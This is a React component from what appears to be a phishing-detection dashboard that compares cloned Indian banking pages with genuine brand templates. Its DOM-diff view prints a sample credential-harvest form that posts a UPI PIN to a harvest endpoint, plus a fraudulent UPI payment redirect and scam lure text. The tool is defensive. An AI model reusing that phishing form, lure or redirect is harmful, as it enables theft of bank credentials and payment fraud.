import React, { useState } from 'react';
import { Eye, Shield, CheckCircle, Fingerprint, Lock, Layers, Code, ExternalLink } from 'lucide-react';
import { ThreatItem } from '../types/threat';
import { GENUINE_BRAND_TEMPLATES } from '../data/mockThreats';

interface VisualSimilarityInspectorProps {
  threats: ThreatItem[];
  selectedThreatId?: string;
}

export const VisualSimilarityInspector: React.FC<VisualSimilarityInspectorProps> = ({
  threats,
  selectedThreatId
}) => {
  const [activeThreatId, setActiveThreatId] = useState<string>(selectedThreatId || threats[0]?.id || 'thr-8901');
  const [comparisonMode, setComparisonMode] = useState<'SIDE_BY_SIDE' | 'OVERLAY_SLIDER' | 'DOM_DIFF'>('SIDE_BY_SIDE');
  const [sliderPosition, setSliderPosition] = useState<number>(50);

  const threat = threats.find(t => t.id === activeThreatId) || threats[0];
  const genuineBrand = GENUINE_BRAND_TEMPLATES[threat.targetBrand] || GENUINE_BRAND_TEMPLATES['SBI YONO'];

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="p-5 rounded-lg bg-[#09090b] border border-[#27272a] flex flex-wrap items-center justify-between gap-4">
        <div>
          <h2 className="text-base font-semibold text-white tracking-tight flex items-center space-x-2">
            <span>Visual & Structural Clone Alignment Studio</span>
          </h2>
          <p className="text-xs text-[#a1a1aa] mt-0.5">
            Perceptual hashing (pHash), Multiscale SSIM pixel comparison, and credential harvest field detection.
          </p>
        </div>

        {/* Threat Switcher */}
        <div className="flex items-center space-x-2">
          <span className="text-xs text-[#71717a] font-mono">Sample:</span>
          <select
            value={activeThreatId}
            onChange={(e) => setActiveThreatId(e.target.value)}
            className="bg-[#121214] border border-[#27272a] text-xs rounded-md px-3 py-1.5 text-white focus:outline-none focus:border-white font-mono"
          >
            {threats.map(t => (
              <option key={t.id} value={t.id}>
                [{t.targetBrand}] {t.domain} (SSIM: {(t.structuralSSIM * 100).toFixed(1)}%)
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Metric Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3 font-mono">
        <div className="p-4 rounded-lg bg-[#09090b] border border-[#27272a]">
          <div className="text-[11px] uppercase text-[#71717a]">Structural SSIM</div>
          <div className="mt-1 text-2xl font-bold text-white">{(threat.structuralSSIM * 100).toFixed(1)}%</div>
          <div className="mt-1 text-[10px] text-[#a1a1aa]">Layout similarity to authentic template</div>
        </div>

        <div className="p-4 rounded-lg bg-[#09090b] border border-[#27272a]">
          <div className="text-[11px] uppercase text-[#71717a]">pHash Hamming Dist</div>
          <div className="mt-1 text-2xl font-bold text-white">{threat.pHashDistance} <span className="text-xs font-normal text-[#71717a]">/ 64 bits</span></div>
          <div className="mt-1 text-[10px] text-[#a1a1aa]">Threshold ≤ 10 denotes visual clone</div>
        </div>

        <div className="p-4 rounded-lg bg-[#09090b] border border-[#27272a]">
          <div className="text-[11px] uppercase text-[#71717a]">Logo OCR Confidence</div>
          <div className="mt-1 text-2xl font-bold text-white">{threat.logoConfidence}%</div>
          <div className="mt-1 text-[10px] text-[#a1a1aa]">Detected genuine brand mark</div>
        </div>

        <div className="p-4 rounded-lg bg-[#09090b] border border-[#27272a]">
          <div className="text-[11px] uppercase text-[#71717a]">DOM Tree Delta</div>
          <div className="mt-1 text-2xl font-bold text-white">{(threat.domEditDistance * 100).toFixed(1)}%</div>
          <div className="mt-1 text-[10px] text-[#a1a1aa]">Node-by-node DOM tag alignment</div>
        </div>
      </div>

      {/* Main Studio View */}
      <div className="p-5 rounded-lg bg-[#09090b] border border-[#27272a] space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-[#27272a] pb-3">
          <div className="text-xs font-mono font-bold text-white uppercase">
            Visual Alignment Comparison: <span className="text-white underline">{threat.targetBrand}</span>
          </div>

          <div className="flex items-center space-x-1 bg-[#121214] p-1 rounded-md border border-[#27272a] text-xs">
            <button
              onClick={() => setComparisonMode('SIDE_BY_SIDE')}
              className={`px-3 py-1 rounded font-medium transition-colors ${
                comparisonMode === 'SIDE_BY_SIDE'
                  ? 'bg-white text-black font-semibold'
                  : 'text-[#a1a1aa] hover:text-white'
              }`}
            >
              Side-by-Side Diff
            </button>
            <button
              onClick={() => setComparisonMode('OVERLAY_SLIDER')}
              className={`px-3 py-1 rounded font-medium transition-colors ${
                comparisonMode === 'OVERLAY_SLIDER'
                  ? 'bg-white text-black font-semibold'
                  : 'text-[#a1a1aa] hover:text-white'
              }`}
            >
              Interactive Slider
            </button>
            <button
              onClick={() => setComparisonMode('DOM_DIFF')}
              className={`px-3 py-1 rounded font-medium transition-colors ${
                comparisonMode === 'DOM_DIFF'
                  ? 'bg-white text-black font-semibold'
                  : 'text-[#a1a1aa] hover:text-white'
              }`}
            >
              DOM Intent Interceptor
            </button>
          </div>
        </div>

        {/* Mode 1: Side by Side */}
        {comparisonMode === 'SIDE_BY_SIDE' && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 font-mono">
            {/* Cloned Page Mockup */}
            <div className="rounded-lg bg-[#121214] border border-[#3f3f46] overflow-hidden">
              <div className="px-4 py-2.5 bg-[#18181b] border-b border-[#27272a] flex items-center justify-between text-xs">
                <span className="font-bold text-white uppercase">Detected Malicious Clone</span>
                <span className="text-[#a1a1aa] truncate max-w-[200px]">{threat.domain}</span>
              </div>

              <div className="p-5 space-y-4 text-xs">
                <div className="p-3 rounded bg-[#000000] border border-[#27272a] space-y-1">
                  <div className="font-bold text-white">{threat.targetBrand} Official Verification Desk</div>
                  <p className="text-[#a1a1aa] text-[11px]">
                    ⚠️ Urgent Action Required: Account verification pending. Enter your 6-Digit UPI PIN to confirm and unlock account.
                  </p>
                </div>

                <div className="space-y-2">
                  <div>
                    <label className="text-[11px] text-[#71717a] block mb-1">Registered Mobile Number</label>
                    <input disabled value="+91 98765 XXXXX" className="w-full bg-[#000000] border border-[#27272a] rounded px-3 py-1.5 text-xs text-[#a1a1aa]" />
                  </div>
                  <div>
                    <div className="flex justify-between items-center mb-1">
                      <label className="text-[11px] text-white font-semibold flex items-center space-x-1">
                        <Lock className="w-3 h-3 text-white" />
                        <span>6-Digit UPI PIN / MPIN (Theft Target)</span>
                      </label>
                      <span className="text-[9px] px-1.5 py-0.5 rounded bg-white text-black font-bold">INTERCEPTED</span>
                    </div>
                    <input disabled value="••••••" className="w-full bg-[#000000] border border-white rounded px-3 py-1.5 text-xs text-white tracking-widest" />
                  </div>
                </div>

                <div className="pt-2 border-t border-[#27272a] flex justify-between items-center text-[10px] text-[#71717a]">
                  <span>Action: /api/harvest.php</span>
                  <span className="px-2 py-0.5 rounded bg-[#27272a] text-white">Fake Portal Submit</span>
                </div>
              </div>
            </div>

            {/* Genuine Reference */}
            <div className="rounded-lg bg-[#121214] border border-[#27272a] overflow-hidden">
              <div className="px-4 py-2.5 bg-[#18181b] border-b border-[#27272a] flex items-center justify-between text-xs">
                <span className="font-bold text-white uppercase">Genuine Verified Template</span>
                <a href={threat.genuineReferenceUrl} target="_blank" rel="noreferrer" className="text-[#d4d4d8] underline flex items-center space-x-1">
                  <span>{genuineBrand.officialDomain}</span>
                  <ExternalLink className="w-3 h-3" />
                </a>
              </div>

              <div className="p-5 space-y-4 text-xs">
                <div className="p-3 rounded bg-[#000000] border border-[#27272a] space-y-1">
                  <div className="font-bold text-white">{genuineBrand.name}</div>
                  <p className="text-[#a1a1aa] text-[11px]">{genuineBrand.securityNotice}</p>
                </div>

                <div className="p-3 rounded bg-[#000000] border border-[#27272a] space-y-2 text-xs">
                  <div className="text-[10px] uppercase text-[#71717a]">Official Authentic VPA Suffixes:</div>
                  <div className="flex flex-wrap gap-1.5">
                    {genuineBrand.officialVpaHandleSuffixes.map(s => (
                      <span key={s} className="px-2 py-0.5 rounded bg-[#18181b] border border-[#27272a] text-white text-[10px]">
                        {s}
                      </span>
                    ))}
                  </div>
                </div>

                <div className="pt-2 border-t border-[#27272a] flex justify-between items-center text-[10px] text-[#71717a]">
                  <span>EV TLS 1.3 Certified</span>
                  <span className="text-white">Verified Canonical Portal</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Mode 2: Overlay Slider */}
        {comparisonMode === 'OVERLAY_SLIDER' && (
          <div className="space-y-4">
            <div className="relative rounded-lg overflow-hidden border border-[#27272a] bg-[#000000] h-[340px]">
              <div className="absolute inset-0 p-8 flex flex-col justify-center items-center text-center bg-[#09090b]">
                <div className="text-white font-mono text-xs font-bold uppercase">Detected Cloned Page</div>
                <div className="text-xs text-[#71717a] mt-1">{threat.domain}</div>
                <div className="mt-4 p-4 rounded bg-[#121214] border border-[#3f3f46] text-xs text-[#d4d4d8] max-w-md font-mono">
                  Fake UPI PIN harvest form directly impersonating {threat.targetBrand}.
                </div>
              </div>

              <div
                className="absolute inset-0 p-8 flex flex-col justify-center items-center text-center bg-[#000000] border-l border-white"
                style={{ clipPath: `inset(0 0 0 ${sliderPosition}%)` }}
              >
                <div className="text-white font-mono text-xs font-bold uppercase">Official Genuine Portal</div>
                <div className="text-xs text-[#71717a] mt-1">{genuineBrand.officialDomain}</div>
                <div className="mt-4 p-4 rounded bg-[#121214] border border-white text-xs text-white max-w-md font-mono">
                  Authentic zero-trust portal with no credential capture endpoints.
                </div>
              </div>

              <div className="absolute top-0 bottom-0 w-1 bg-white pointer-events-none" style={{ left: `${sliderPosition}%` }} />
            </div>

            <div className="flex items-center space-x-4 px-2 font-mono text-xs text-[#a1a1aa]">
              <span>Clone (100%)</span>
              <input
                type="range"
                min="0"
                max="100"
                value={sliderPosition}
                onChange={(e) => setSliderPosition(Number(e.target.value))}
                className="flex-1 accent-white h-1.5 bg-[#27272a] rounded-lg cursor-pointer"
              />
              <span>Genuine (100%)</span>
            </div>
          </div>
        )}

        {/* Mode 3: DOM Diff */}
        {comparisonMode === 'DOM_DIFF' && (
          <div className="p-4 rounded-lg bg-[#000000] border border-[#27272a] space-y-2 font-mono text-xs">
            <div className="text-white font-bold text-xs uppercase flex items-center space-x-2">
              <Code className="w-4 h-4 text-white" />
              <span>Extracted Malicious Form & Handlers:</span>
            </div>
            <pre className="p-3 rounded bg-[#09090b] border border-[#27272a] text-[#d4d4d8] text-[11px] leading-relaxed overflow-x-auto">
{`<!-- Cloned Credential Harvest Form -->
<form action="https://${threat.domain}/api/harvest.php" method="POST">
  <input type="text" name="registered_mobile" />
  <input type="password" name="upi_mpin" maxlength="6" data-intercept="true" />
  <input type="hidden" name="vpa_receiver" value="${threat.extractedUPI_VPA?.[0] || 'sbikyc.refund99@paytm'}" />
  <button type="submit">Verify Now</button>
</form>

<!-- Hijacked Payment Scheme -->
window.location.href = "${threat.qrCodePayload || `upi://pay?pa=${threat.extractedUPI_VPA?.[0] || 'fraud@paytm'}&am=1.00`}";`}
            </pre>
          </div>
        )}
      </div>
    </div>
  );
};
